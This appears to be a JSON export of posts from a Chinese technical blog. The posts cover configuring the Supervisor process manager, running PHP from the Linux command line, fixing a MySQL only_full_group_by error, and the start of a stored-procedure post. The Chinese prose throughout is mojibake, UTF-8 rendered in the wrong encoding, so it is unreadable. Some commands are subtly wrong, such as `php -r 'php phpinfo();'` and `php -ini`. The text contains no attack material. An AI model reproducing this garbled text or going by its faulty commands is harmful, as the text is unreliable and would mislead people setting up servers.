é…ç½®Supervisorè¿è¡Œæ—¶ä¼šå¯åŠ¨ä¸€ä¸ªè¿›ç¨‹â€”â€”supervisord ã€‚ supervisordï¼šå®ƒè´Ÿè´£å¯åŠ¨æ‰€ç®¡ç†çš„è¿›ç¨‹ï¼Œå¹¶å°†æ‰€ç®¡ç†çš„è¿›ç¨‹ä½œä¸ºè‡ªå·±çš„å­è¿›ç¨‹æ¥å¯åŠ¨ï¼Œè€Œä¸”å¯ä»¥åœ¨æ‰€ç®¡ç†çš„è¿›ç¨‹å‡ºç°å´©æºƒæ—¶è‡ªåŠ¨é‡å¯ã€‚ supervisorctlï¼šæ˜¯å‘½ä»¤è¡Œç®¡ç†å·¥å…·ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡Œ stopã€startã€restart ç­‰å‘½ä»¤ï¼Œæ¥å¯¹è¿™äº›å­è¿›ç¨‹è¿›è¡Œç®¡ç†ã€‚ æŸ¥çœ‹é»˜è®¤é…ç½®é¡¹ 1$ echo_supervisord_conf å°†é»˜è®¤é…ç½®é¡¹é‡å®šå‘è‡³é…ç½®æ–‡ä»¶ï¼š 1$ echo_supervisord_conf &gt; &#x2F;etc&#x2F;supervisord.conf ç„¶åå¯ä»¥çœ‹åˆ° /etc/ é…ç½®æ–‡ä»¶ä¸‹å‡ºç°äº†ä»¥ä¸‹æ–‡ä»¶ï¼Œå…¶ä¸­/etc/supervisor æ˜¯æˆ‘ä»¬éœ€è¦çš„é…ç½®æ–‡ä»¶ã€‚ 1234$ find &#x2F;etc&#x2F; -name supervisor&#x2F;etc&#x2F;default&#x2F;supervisor&#x2F;etc&#x2F;init.d&#x2F;supervisor&#x2F;etc&#x2F;supervisor /etc/supervisord.conf æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼Œå‚è€ƒä»¥ä¸‹éƒ¨åˆ†é…ç½®ï¼Œ; è¡¨ç¤ºæ³¨é‡Šã€‚ å› ä¸ºSupervisoré»˜è®¤é…ç½®ä¼šæŠŠsocketæ–‡ä»¶å’Œpidå®ˆæŠ¤è¿›ç¨‹ç”Ÿæˆåœ¨/tmp/ç›®å½•ä¸‹ï¼Œ/tmp/ç›®å½•æ˜¯ç¼“å­˜ç›®å½•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æ¢æˆ/var/runç›®å½•ã€‚ 12345678910111213141516171819202122232425262728293031323334353637[unix_http_server];file&#x3D;&#x2F;tmp&#x2F;supervisor.sock ; UNIX socket æ–‡ä»¶ï¼Œsupervisorctl ä¼šä½¿ç”¨file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; ä¿®æ”¹ä¸º &#x2F;var&#x2F;run ç›®å½•ï¼Œé¿å…è¢«ç³»ç»Ÿåˆ é™¤;chmod&#x3D;0700 ; socket æ–‡ä»¶çš„ modeï¼Œé»˜è®¤æ˜¯ 0700;chown&#x3D;nobody:nogroup ; socket æ–‡ä»¶çš„ ownerï¼Œæ ¼å¼ï¼š uid:gid;[inet_http_server] ; HTTP æœåŠ¡å™¨ï¼Œæä¾› web ç®¡ç†ç•Œé¢;port&#x3D;127.0.0.1:9001 ; Web ç®¡ç†åå°è¿è¡Œçš„ IP å’Œç«¯å£ï¼Œå¦‚æœå¼€æ”¾åˆ°å…¬ç½‘ï¼Œéœ€è¦æ³¨æ„å®‰å…¨æ€§;username&#x3D;user ; ç™»å½•ç®¡ç†åå°çš„ç”¨æˆ·å;password&#x3D;123 ; ç™»å½•ç®¡ç†åå°çš„å¯†ç [supervisord];logfile&#x3D;&#x2F;tmp&#x2F;supervisord.log ; æ—¥å¿—æ–‡ä»¶ï¼Œé»˜è®¤æ˜¯ $CWD&#x2F;supervisord.loglogfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;supervisord.log ; ä¿®æ”¹ä¸º &#x2F;var&#x2F;log ç›®å½•ï¼Œé¿å…è¢«ç³»ç»Ÿåˆ é™¤logfile_maxbytes&#x3D;50MB ; æ—¥å¿—æ–‡ä»¶å¤§å°ï¼Œè¶…å‡ºä¼š rotateï¼Œé»˜è®¤ 50MBlogfile_backups&#x3D;10 ; æ—¥å¿—æ–‡ä»¶ä¿ç•™å¤‡ä»½æ•°é‡é»˜è®¤ 10loglevel&#x3D;info ; æ—¥å¿—çº§åˆ«ï¼Œé»˜è®¤ infoï¼Œå…¶å®ƒ: debug,warn,trace;pidfile&#x3D;&#x2F;tmp&#x2F;supervisord.pid ; pid æ–‡ä»¶pidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ; ä¿®æ”¹ä¸º &#x2F;var&#x2F;run ç›®å½•ï¼Œé¿å…è¢«ç³»ç»Ÿåˆ é™¤nodaemon&#x3D;false ; æ˜¯å¦åœ¨å‰å°å¯åŠ¨ï¼Œé»˜è®¤æ˜¯ falseï¼Œå³ä»¥ daemon çš„æ–¹å¼å¯åŠ¨minfds&#x3D;1024 ; å¯ä»¥æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦çš„æœ€å°å€¼ï¼Œé»˜è®¤ 1024minprocs&#x3D;200 ; å¯ä»¥æ‰“å¼€çš„è¿›ç¨‹æ•°çš„æœ€å°å€¼ï¼Œé»˜è®¤ 200; the below section must remain in the config file for RPC; (supervisorctl&#x2F;web interface) to work, additional interfaces may be; added by defining them in separate rpcinterface: sections[rpcinterface:supervisor]supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface[supervisorctl];serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;supervisor.sock ; é€šè¿‡ UNIX socket è¿æ¥ supervisordï¼Œè·¯å¾„ä¸ unix_http_server éƒ¨åˆ†çš„ file ä¸€è‡´serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; ä¿®æ”¹ä¸º &#x2F;var&#x2F;run ç›®å½•ï¼Œé¿å…è¢«ç³»ç»Ÿåˆ é™¤;serverurl&#x3D;http:&#x2F;&#x2F;127.0.0.1:9001 ; é€šè¿‡ HTTP çš„æ–¹å¼è¿æ¥ supervisord; åŒ…å«å…¶ä»–çš„é…ç½®æ–‡ä»¶[include]files &#x3D; relative&#x2F;directory&#x2F;*.ini ; å¯ä»¥æ˜¯ *.conf æˆ– *.ini /etc/supervisor/conf.d åˆ™æ˜¯ç”¨æ¥é…ç½®ç®¡ç†è¿›ç¨‹çš„é…ç½®æ–‡ä»¶ï¼Œæ‰€æœ‰éœ€è¦è¢«supervisor ç®¡ç†çš„è¿›ç¨‹éƒ½éœ€è¦åœ¨è¿™é‡Œå…ˆé…ç½®ã€‚ 123456789101112131415[program:demo]command&#x3D;php demo.php &#x2F;&#x2F; éœ€è¦æ‰§è¡Œé˜Ÿåˆ—çš„åç§°directory&#x3D; &#x2F;var&#x2F;www &#x2F;&#x2F; å‘½ä»¤æ‰§è¡Œçš„ç›®å½•æˆ–è€…è¯´æ‰§è¡Œ command ä¹‹å‰ï¼Œå…ˆåˆ‡æ¢åˆ°å·¥ä½œç›®å½• å¯ä»¥ç†è§£ä¸ºåœ¨æ‰§è¡Œå‘½ä»¤å‰ä¼šåˆ‡æ¢åˆ°è¿™ä¸ªç›®å½• process_name&#x3D;%(process_num)02d &#x2F;&#x2F; é»˜è®¤ä¸º %(program_name)sï¼Œå³ [program:x] ä¸­çš„ xè¿™ä¸ªæ˜¯è¿›ç¨‹åï¼Œå¦‚æœä¸‹é¢çš„numprocså‚æ•°ä¸º1çš„è¯ï¼Œå°±ä¸ç”¨ç®¡è¿™ä¸ªå‚æ•°äº†ï¼Œå®ƒé»˜è®¤å€¼%(program_name)sä¹Ÿå°±æ˜¯ä¸Šé¢çš„é‚£ä¸ªprogramå†’å·åé¢çš„numprocs&#x3D;1 &#x2F;&#x2F; è¿›ç¨‹æ•°é‡å½“ä¸ä¸º1æ—¶çš„æ—¶å€™ï¼Œå°±æ˜¯è¿›ç¨‹æ± çš„æ¦‚å¿µï¼Œæ³¨æ„process_nameçš„è®¾ç½®autostart&#x3D;true &#x2F;&#x2F; æ˜¯å¦è‡ªåŠ¨å¯åŠ¨autorestart&#x3D;true &#x2F;&#x2F; ç¨‹åºæ„å¤–é€€å‡ºæ˜¯å¦è‡ªåŠ¨é‡å¯startsecs&#x3D;1 &#x2F;&#x2F; è‡ªåŠ¨é‡å¯é—´éš” startretries&#x3D;20 &#x2F;&#x2F; å½“è¿›ç¨‹å¯åŠ¨å¤±è´¥åï¼Œæœ€å¤§å°è¯•å¯åŠ¨çš„æ¬¡æ•°ã€‚ã€‚å½“è¶…è¿‡3æ¬¡åï¼Œsupervisorå°†æŠŠæ­¤è¿›ç¨‹çš„çŠ¶æ€ç½®ä¸ºFAIL é»˜è®¤å€¼ä¸º3redirect_stderr&#x3D;true &#x2F;&#x2F; å¦‚æœä¸ºtrueï¼Œåˆ™stderrçš„æ—¥å¿—ä¼šè¢«å†™å…¥stdoutæ—¥å¿—æ–‡ä»¶ä¸­ ç†è§£ä¸ºé‡å®šå‘è¾“å‡ºçš„æ—¥å¿—user&#x3D;root &#x2F;&#x2F; è¿™ä¸ªå‚æ•°å¯ä»¥è®¾ç½®ä¸€ä¸ªérootç”¨æˆ·ï¼Œå½“æˆ‘ä»¬ä»¥rootç”¨æˆ·å¯åŠ¨supervisordä¹‹åã€‚æˆ‘è¿™é‡Œé¢è®¾ç½®çš„è¿™ä¸ªç”¨æˆ·ï¼Œä¹Ÿå¯ä»¥å¯¹supervisordè¿›è¡Œç®¡ç† stopsignal&#x3D;INTstderr_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.err.log &#x2F;&#x2F; å­è¿›ç¨‹çš„stdoutçš„æ—¥å¿—è·¯å¾„ è¾“å‡ºæ—¥å¿—æ–‡ä»¶stdout_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.out.log &#x2F;&#x2F; é”™è¯¯æ—¥å¿—æ–‡ä»¶ å½“redirect_stderr&#x3D;trueã€‚è¿™ä¸ªå°±ä¸ç”¨ å¯åŠ¨1$ supervisord -c &#x2F;etc&#x2F;supervisord.conf å¸¸ç”¨å‘½ä»¤æ•´ç†åœæ­¢è¿›ç¨‹ï¼Œprogram_name ä¸º [program:x] é‡Œçš„ x 1supervisorctl stop program_name å¯åŠ¨è¿›ç¨‹ 1supervisorctl start program_name é‡å¯è¿›ç¨‹ 1supervisorctl restart program_name ç»“æŸæ‰€æœ‰å±äºåä¸º groupworker è¿™ä¸ªåˆ†ç»„çš„è¿›ç¨‹ (startï¼Œrestart åŒç†) 1supervisorctl stop groupworker: ç»“æŸ groupworker:name1 è¿™ä¸ªè¿›ç¨‹ (startï¼Œrestart åŒç†) 1supervisorctl stop groupworker:name1 åœæ­¢å…¨éƒ¨è¿›ç¨‹ï¼Œæ³¨ï¼šstartã€restartã€stop éƒ½ä¸ä¼šè½½å…¥æœ€æ–°çš„é…ç½®æ–‡ä»¶ 1supervisorctl stop all è½½å…¥æœ€æ–°çš„é…ç½®æ–‡ä»¶ï¼Œåœæ­¢åŸæœ‰è¿›ç¨‹å¹¶æŒ‰æ–°çš„é…ç½®å¯åŠ¨ã€ç®¡ç†æ‰€æœ‰è¿›ç¨‹ 1supervisorctl reload æ ¹æ®æœ€æ–°çš„é…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨æ–°é…ç½®æˆ–æœ‰æ”¹åŠ¨çš„è¿›ç¨‹ï¼Œé…ç½®æ²¡æœ‰æ”¹åŠ¨çš„è¿›ç¨‹ä¸ä¼šå—å½±å“è€Œé‡å¯ 1supervisorctl update å¸¸è§é—®é¢˜unlinking stale socket /var/run/supervisor.sock1234$ find &#x2F; -name supervisor.sock&#x2F;run&#x2F;supervisor.sock$ unlink &#x2F;run&#x2F;supervisor.sock å‚è€ƒé“¾æ¥ â€œunix:///tmp/supervisor.sock no such fileâ€ é”™è¯¯å¤„ç† https://segmentfault.com/a/1190000015768529 ä½¿ç”¨ supervisor ç®¡ç†è¿›ç¨‹ Python è¿›ç¨‹ç®¡ç†å·¥å…· Supervisor ä½¿ç”¨æ•™ç¨‹","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Tutorial","slug":"PHP/Tutorial","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/"},{"name":"è¿›ç¨‹ç®¡ç†","slug":"PHP/Tutorial/è¿›ç¨‹ç®¡ç†","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"è¿›ç¨‹ç®¡ç†","slug":"è¿›ç¨‹ç®¡ç†","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"Supervisor","slug":"Supervisor","permalink":"https://www.0x2beace.com/tags/Supervisor/"}]},{"title":"åœ¨ Linux å‘½ä»¤è¡Œä¸­æ‰§è¡Œå’Œä½¿ç”¨ PHP ä»£ç ","slug":"execute-and-use-php-code-on-the-linux-command-line","date":"2020-07-29T00:08:12.000Z","updated":"2020-11-27T03:05:13.069Z","comments":true,"path":"execute-and-use-php-code-on-the-linux-command-line/","link":"","permalink":"https://www.0x2beace.com/execute-and-use-php-code-on-the-linux-command-line/","excerpt":"ä¼—æ‰€å‘¨çŸ¥ï¼ŒPHPæ˜¯ä¸€é—¨è„šæœ¬è¯­è¨€ï¼Œä¸»è¦ç”¨äºæœåŠ¡ç«¯ï¼ˆJavaScript ç”¨äºå®¢æˆ·ç«¯ï¼‰ä»¥é€šè¿‡HTTP ç”ŸæˆåŠ¨æ€ç½‘é¡µã€‚","text":"ä¼—æ‰€å‘¨çŸ¥ï¼ŒPHPæ˜¯ä¸€é—¨è„šæœ¬è¯­è¨€ï¼Œä¸»è¦ç”¨äºæœåŠ¡ç«¯ï¼ˆJavaScript ç”¨äºå®¢æˆ·ç«¯ï¼‰ä»¥é€šè¿‡HTTP ç”ŸæˆåŠ¨æ€ç½‘é¡µã€‚ æ‰€ä»¥ä¸å…¶ä»–è„šæœ¬è¯­è¨€ä¸€æ ·ï¼Œå¯ä»¥ç›´æ¥åœ¨ç»ˆç«¯ä¸­ä¸éœ€è¦ç½‘é¡µæµè§ˆå™¨æ¥è¿è¡ŒPHP ä»£ç ã€‚ è·å–å®‰è£…ä¿¡æ¯åœ¨å®‰è£…å®ŒPHP ä»¥åŠNginx ä¹‹åï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬é€šå¸¸éœ€è¦åšçš„æ˜¯ï¼Œåœ¨/usr/local/var/www (Mac ä¸Šçš„Nginx å·¥ä½œç›®å½•)ä¸Šåˆ›å»ºä¸€ä¸ªå†…å®¹ä¸º&lt;?php phpinfo(); ?&gt;ï¼Œåä¸ºindex.phpçš„æ–‡ä»¶æ¥æµ‹è¯•PHP æ˜¯å¦å®‰è£…æ­£ç¡®ã€‚ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼š 1# echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php ç„¶åï¼Œä½¿ç”¨æµè§ˆå™¨è®¿é—®http://127.0.0.1/index.phpï¼Œä¸å‡ºæ„å¤–å¯ä»¥çœ‹åˆ°ï¼š å¦‚ä½•åœ¨ç»ˆç«¯ä¸­ç›´æ¥æŸ¥çœ‹è¯¥ä¿¡æ¯ï¼Ÿ 1# php -f &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php | less å¦‚æœä½ è§‰å¾—ä¸Šé¢è¿™ç§æ–¹å¼å¤ªéº»çƒ¦äº†ï¼Œé‚£ä¹ˆè¿˜æœ‰ä¸€ç§æ›´ç®€ä¾¿çš„æ–¹å¼å¯ä»¥è¾¾åˆ°åŒæ ·çš„æ•ˆæœã€‚ 1# php -r &#39;php phpinfo();&#39; | less äº¤äº’æ¨¡å¼æœ‰æ—¶å€™æˆ‘ä»¬ä¼šé‡åˆ°è¿™æ ·ä¸€ç§æƒ…å†µï¼Œæƒ³æµ‹è¯•ä¸€å°æ®µä»£ç ï¼Œçœ‹çœ‹å…¶è¿è¡Œç»“æœï¼Œä½†æ˜¯åˆä¸æƒ³é‡æ–°åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¤ªéº»çƒ¦äº†ã€‚ å¦‚æœè¿™ä¸ªæ—¶å€™æœ‰ä¸€ä¸ªåœ°æ–¹å¯ä»¥ç›´æ¥è¿è¡Œè¿™æ®µä»£ç ä¸”è¾“å‡ºç»“æœï¼Œé‚£è¯¥å¤šå¥½å•Šã€‚ PHP ä¸ºæˆ‘ä»¬æä¾›äº†ä¸¤ç§äº¤äº’æ¨¡å¼ï¼Œå‰è€…æ˜¯è‡ªåŠ¨çš„ï¼Œåè€…æ˜¯æ‰‹åŠ¨çš„ã€‚ Interactive shell Interactive mode enabled ä¸¤ç§æ¨¡å¼éƒ½æ˜¯ä½¿ç”¨ php -a å‘½ä»¤è¿›å…¥ã€‚ Interactive shellä½¿ç”¨è¿™ä¸ªäº¤äº’å¼shellï¼Œä½ å¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡Œçª—å£é‡Œè¾“å…¥PHPå¹¶ç›´æ¥è·å¾—è¾“å‡ºç»“æœã€‚ 1234567$ php -aInteractive shellphp &gt;echo &quot;Hello PHP&quot;;Hello PHPphp &gt; echo 10+90;100 å›è½¦å³å¯æŸ¥çœ‹è¾“å‡ºå†…å®¹ã€‚ Interactive mode enabled1234$ php -aInteractive mode enabledphp &gt;echo &quot;Hello PHP&quot;; å¦‚æœå‡ºç°çš„æ˜¯è¿™ä¸ªæ¨¡å¼ï¼Œè¯´æ˜ä½ çš„PHPå¹¶ä¸æ”¯æŒäº¤äº’å¼shellï¼Œ ä¸è¿‡ä¸ç”¨æ‹…å¿ƒï¼Œè¿™ä¸ªæ¨¡å¼åŒæ ·ä¹Ÿå¯ä»¥æ‰§è¡ŒPHP ä»£ç ï¼Œåªæ˜¯ä»£ç çš„æ‰§è¡Œæ–¹å¼æœ‰äº›åŒºåˆ«ã€‚ è¾“å…¥äº†æ‰€æœ‰PHPä»£ç åï¼Œè¾“å…¥Ctrl-Zï¼ˆwindowsé‡Œï¼‰ï¼Œæˆ–è¾“å…¥Ctrl-Dï¼ˆlinuxé‡Œï¼‰ï¼Œä½ è¾“å…¥çš„æ‰€æœ‰ä»£ç å°†ä¼šä¸€æ¬¡æ‰§è¡Œå®Œæˆå¹¶è¾“å‡ºç»“æœã€‚ è¾“å…¥exitæˆ–è€…âŒƒ + c é€€å‡ºäº¤äº’æ¨¡å¼ã€‚ PHP è„šæœ¬åœ¨ç»ˆç«¯ä¸­å¯ä»¥æŠŠPHP è„šæœ¬ä½œä¸ºShell è„šæœ¬æ¥è¿è¡Œã€‚ é¦–å…ˆä½ éœ€è¦åˆ›å»ºä¸€ä¸ªPHP è„šæœ¬æ–‡ä»¶ï¼š 1# echo -e &#39;#!&#x2F;usr&#x2F;bin&#x2F;php\\n&lt;?php phpinfo();?&gt;&#39; &gt; phpscript.php -e è¡¨ç¤ºæ¿€æ´»è½¬ä¹‰å­—ç¬¦ã€‚ æ³¨æ„ï¼Œè¿™ä¸ªè„šæœ¬æ–‡ä»¶ä¸­çš„ç¬¬ä¸€è¡Œ#!/usr/bin/phpï¼Œå°±åƒæ˜¯Shell è„šæœ¬ä¸­çš„#!/bin/bashã€‚ç›®çš„æ˜¯å‘Šè¯‰Linux å‘½ä»¤è¡Œä½¿ç”¨PHP è§£æå™¨æ¥è§£æè¯¥æ–‡ä»¶ã€‚ è¿è¡Œè¯¥è„šæœ¬ï¼š 12# chmod +x phpscript.php &#x2F;&#x2F; ä½¿è„šæœ¬å…·æœ‰æ‰§è¡Œæƒé™# .&#x2F;phpscript.php &#x2F;&#x2F;æ‰§è¡Œè„šæœ¬ PHP æœåŠ¡PHP æœ‰å†…ç½®ä¸€ä¸ªWebServerï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿å¿«é€Ÿçš„æ­å»ºä¸€ä¸ªPHP æœåŠ¡ã€‚ 1$ php -t &#x2F;project to path -S localhost:port ç„¶åé€šè¿‡æµè§ˆå™¨è®¿é—®localhost:port å°±å¯ä»¥äº†ã€‚ æ€»ç»“ php -aï¼šè¿›å…¥äº¤äº’æ¨¡å¼ php -fï¼šè§£æå’Œæ‰§è¡Œæ–‡ä»¶ php -hï¼šè·å–å¸®åŠ© php -iï¼šæŸ¥çœ‹PHP ä¿¡æ¯å’Œé…ç½® php -mï¼šæ˜¾ç¤ºå·²ç»å®‰è£…çš„æ¨¡å— php -rï¼šè¿è¡ŒPHPä»£ç ä¸ä½¿ç”¨è„šæœ¬æ ‡ç­¾â€™â€˜ php -vï¼šæŸ¥çœ‹PHP ç‰ˆæœ¬ php -iniï¼šæŸ¥çœ‹åŠ è½½é…ç½®æ–‡ä»¶ï¼ˆphp.iniã€conf.dï¼‰ php -i | grep configureï¼šæŸ¥çœ‹é™æ€ç¼–è¯‘æ¨¡å— php --ri swooleï¼šæŸ¥çœ‹æŒ‡å®šæ¨¡å—çš„é…ç½® locate php.iniï¼šæŸ¥è¯¢æœ¬åœ°é…ç½®æ–‡ä»¶ time php script.phpï¼šæŸ¥çœ‹ç¨‹åºçš„æ‰§è¡Œæ—¶é—´ å‚è€ƒé“¾æ¥ åœ¨ Linux å‘½ä»¤è¡Œä¸­æ‰§è¡Œå’Œä½¿ç”¨ PHP ä»£ç  12 ä¸ª Linux ç»ˆç«¯ä¸­æœ‰ç”¨çš„ PHP å‘½ä»¤è¡Œç”¨æ³•","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"å¦‚ä½•è§£å†³â€œORDER BYå­å¥ä¸åœ¨SELECTåˆ—è¡¨ä¸­â€çš„é—®é¢˜","slug":"list-causes-mysql-5-7-with-select-distinct-and-order-by","date":"2020-07-28T00:29:37.000Z","updated":"2020-07-28T15:28:10.444Z","comments":true,"path":"list-causes-mysql-5-7-with-select-distinct-and-order-by/","link":"","permalink":"https://www.0x2beace.com/list-causes-mysql-5-7-with-select-distinct-and-order-by/","excerpt":"è®°å½•ä¸€ä¸ªæœ€è¿‘é‡åˆ°çš„Mysql é—®é¢˜ã€‚","text":"è®°å½•ä¸€ä¸ªæœ€è¿‘é‡åˆ°çš„Mysql é—®é¢˜ã€‚ é—®é¢˜æè¿°ï¼šåœ¨æœ¬åœ°é¡¹ç›®ä¸­ï¼Œéƒ¨åˆ†SQL è¯­å¥æ‰§è¡Œèµ·æ¥ï¼Œæ€»æ˜¯ä¼šæŠ¥ä¸€ä¸ªé”™ã€‚è€ŒåŒæ ·çš„SQLï¼Œåœ¨çº¿ä¸Šçš„æœåŠ¡å™¨ä¸­æ‰§è¡Œèµ·æ¥æ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚ é”™è¯¯æç¤ºå†…å®¹ï¼š 1Expression #2 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;foodorder.orderlist.cname&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by QMYSQL: Unable to execute query æˆ‘çš„ç¬¬ä¸€ååº”å°±æ˜¯æ£€æŸ¥Mysql çš„ç‰ˆæœ¬ï¼Œå¾ˆå·§çš„æ˜¯æœ¬åœ°Mysqlçš„ç‰ˆæœ¬ç¡®å®æ¯”æœåŠ¡å™¨çš„ç‰ˆæœ¬ä½ä¸€äº›ã€‚å¾ˆå¿«æˆ‘å°±æƒ³åˆ°ä¸€å®šæ˜¯ç‰ˆæœ¬å­˜åœ¨å·®å¼‚æ€§ï¼Œå¯¼è‡´è¯­æ³•ä¸å…¼å®¹ã€‚ å‡çº§Mysqlæ—¢ç„¶æ˜¯ç‰ˆæœ¬ä¸ä¸€çš„é—®é¢˜ï¼Œé‚£å°±å‡çº§æœ¬åœ°çš„Mysql å¥½äº†ã€‚ å› ä¸ºæˆ‘çš„Mysql æ˜¯ä¹‹å‰é€šè¿‡Homebrew å®‰è£…çš„ï¼Œæ‰€ä»¥å¦‚éœ€è¦å‡çº§ï¼Œæ ¹æœ¬ä¸ç”¨æˆ‘è‡ªå·±æ‰‹åŠ¨å»å¯»æ‰¾å®‰è£…åŒ…ï¼Œç›´æ¥é€šè¿‡Homebrew çš„Upgrade å‘½ä»¤è‡ªåŠ¨å‡çº§å°±å¥½äº†ã€‚ èµ·åˆæˆ‘è¿˜æ‹…å¿ƒè‡ªåŠ¨å‡çº§ä¼šä¸ä¼šæŠŠæˆ‘çš„Mysql çš„ç‰ˆæœ¬æ›´æ–°çš„5.7ä»¥ä¸Šï¼Œåæ¥è¯æ˜æ˜¯æˆ‘æƒ³å¤šäº†ã€‚ ä¸è¿‡åœ¨æ­£å¼æ›´æ–°ä¹‹å‰éœ€è¦åšå¥½ä»¥ä¸‹å‡ ä»¶äº‹æƒ…ï¼š å¯¹æ•°æ®åº“åšå¥½å¿…è¦çš„å¤‡ä»½ åœæ­¢æœ¬åœ°Mysql æœåŠ¡ ç¡®å®šæ‰€è¦æ›´æ–°çš„Mysql ç‰ˆæœ¬ åšå¥½ä»¥ä¸Šä¸‰ä»¶äº‹ä¹‹åï¼Œå°±å¯ä»¥å¼€å§‹å‡çº§äº†ã€‚ 1234$ brew search mysqlmysql@5.7 âœ”$ brew upgrade mysql@5.7... ç»ˆäºå®‰è£…å¥½ä¹‹åï¼Œå†æ¬¡å¼€å¯Mysql çš„æœåŠ¡ï¼Œæˆ‘å‘ç°è¿˜æ˜¯æ²¡æœ‰è§£å†³æˆ‘çš„é—®é¢˜ï¼Œè¿˜æ˜¯ä¼šæç¤ºç›¸åŒçš„é”™è¯¯ã€‚ è¿™æ—¶å€™æˆ‘æ‰æ„è¯†åˆ°è¿™ä¸ªé—®é¢˜å’ŒMysql çš„ç‰ˆæœ¬æ²¡æœ‰å…³ç³»ï¼Œæœ‰å…³ç³»åº”è¯¥æ˜¯ç›¸å…³çš„æ¨¡å—ã€‚ é€šè¿‡æŸ¥é˜…ä¸€ç•ªèµ„æ–™ï¼Œæ‰å‘ç°æ˜¯å› ä¸º group by ä¸­çš„åˆ—ä¸€å®šè¦å‡ºç°åœ¨ select ä¸­ï¼Œé™¤éå¼ºåˆ¶ sqlmode ä¸­ä½¿ç”¨ ONLY_FULL_GROUP_BYã€‚ å¼€å¯sql-mode æ¨¡å¼123456789$ vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.cnf# å¢åŠ å¦‚ä¸‹å†…å®¹[mysqld]sql_mode&#x3D;&#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&#39;;# æˆ–è€…[mysqld]sql_mode &#x3D; &quot;&quot; é‡å¯Mysql æœåŠ¡å™¨ï¼Œå³å¯ã€‚ å‚è€ƒé“¾æ¥ å¦‚ä½•è§£å†³ MySQL 5.7å¸¦æœ‰SELECT DISTINCTå’ŒORDER BYçš„é—®é¢˜ | stack voerflow Mysql æœåŠ¡å™¨SQL æ¨¡å¼","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql å­˜å‚¨è¿‡ç¨‹å…¥é—¨","slug":"getting-started-with-mysql-stored-procedures","date":"2020-07-27T15:50:50.000Z","updated":"2020-07-27T15:51:55.775Z","comments":true,"path":"getting-started-with-mysql-stored-procedures/","link":"","permalink":"https://www.0x2beace.com/getting-started-with-mysql-stored-procedures/","excerpt":"æœ€è¿‘é¢ä¸´ä¸€ä¸ªéœ€æ±‚ï¼Œéœ€è¦ä½¿ç”¨Mysql å†™ä¸€æ®µå­˜å‚¨è¿‡ç¨‹ï¼Œå¯¹æ•°æ®åº“ä¸­çš„æ•°æ®è¡¨åšæ‰¹é‡æ“ä½œã€‚ åº”è¯¥ç®—æ˜¯çŸ¥è¯†ç›²åŒºäº†ï¼ŒèŠ±äº†ä¸€äº›æ—¶é—´å»å­¦ä¹ å¦‚ä½•å†™å¥½ä¸€ä¸ªå­˜å‚¨è¿‡ç¨‹ï¼Œæœ€ç»ˆä¹Ÿé¡ºåˆ©å†™å‡ºæ¥äº†ï¼Œè®°å½•ä¸€ä¸‹ã€‚","text":"æœ€è¿‘é¢ä¸´ä¸€ä¸ªéœ€æ±‚ï¼Œéœ€è¦ä½¿ç”¨Mysql å†™ä¸€æ®µå­˜å‚¨è¿‡ç¨‹ï¼Œå¯¹æ•°æ®åº“ä¸­çš„æ•°æ®è¡¨åšæ‰¹é‡æ“ä½œã€‚ åº”è¯¥ç®—æ˜¯çŸ¥è¯†ç›²åŒºäº†ï¼ŒèŠ±äº†ä¸€äº›æ—¶é—´å»å­¦ä¹ å¦‚ä½•å†™å¥½ä¸€ä¸ªå­˜å‚¨è¿‡ç¨‹ï¼Œæœ€ç»ˆä¹Ÿé¡ºåˆ©å†™å‡ºæ¥äº†ï¼Œè®°å½•ä¸€ä¸‹ã€‚ 